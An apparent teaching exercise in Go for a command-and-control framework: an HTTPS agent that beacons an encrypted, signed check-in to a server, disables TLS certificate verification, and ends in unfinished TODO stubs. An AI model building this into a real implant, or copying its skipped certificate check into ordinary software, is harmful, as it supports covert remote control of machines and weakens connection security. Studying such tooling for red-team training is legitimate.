package agent

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"

	"c2framework/internals/crypto"
	"c2framework/internals/server"
)

// HTTPSAgent implements the Agent interface for HTTPS
type HTTPSAgent struct {
	serverAddr   string
	client       *http.Client
	sharedSecret string
}

// NewHTTPSAgent creates a new HTTPS agent
func NewHTTPSAgent(serverIP string, serverPort string, sharedSecret string) *HTTPSAgent {
	// Create TLS config that accepts self-signed certificates
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	// Create HTTP client with custom TLS config
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
		},
	}

	return &HTTPSAgent{
		serverAddr:   fmt.Sprintf("%s:%s", serverIP, serverPort),
		client:       client,
		sharedSecret: sharedSecret,
	}
}

// Send implements Communicator.Send for HTTPS
func (c *HTTPSAgent) Send(ctx context.Context) (json.RawMessage, error) {
	url := fmt.Sprintf("https://%s/", c.serverAddr)

	// Prepare check-in data (could include agent ID, status, etc.)
	checkInData := map[string]interface{}{
		"status": "active",
	}

	plaintext, _ := json.Marshal(checkInData)

	// Encrypt the payload
	encryptedBody, err := crypto.Encrypt(plaintext, c.sharedSecret)
	if err != nil {
		return nil, fmt.Errorf("encrypting payload: %w", err)
	}

	// Create request with encrypted body
	req, err := http.NewRequestWithContext(ctx, "POST", url,
		strings.NewReader(encryptedBody))
	if err != nil {
		return nil, fmt.Errorf("creating request: %w", err)
	}

	req.Header.Set("Content-Type", "application/octet-stream")

	// Sign the request (from previous lesson)
	SignRequest(req, []byte(encryptedBody), c.sharedSecret)

	resp, err := c.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("sending request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
	}

	// Read encrypted response
	encryptedResponse, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("reading response: %w", err)
	}

	// Decrypt response
	decrypted, err := crypto.Decrypt(string(encryptedResponse), c.sharedSecret)
	if err != nil {
		return nil, fmt.Errorf("decrypting response: %w", err)
	}

	// Unmarshal into HTTPSResponse to validate structure
	// TODO: Instantiate httpsResp of type httpsResp server.HTTPSResponse
	// TODO unmarshall decrypted into httpsResp

	// Marshal back to json.RawMessage
	// TODO Marshall httpsResp back as jsonData
	// TODO: Error-check

	// TODO: return json.RawMessage(jsonData) and nil
}
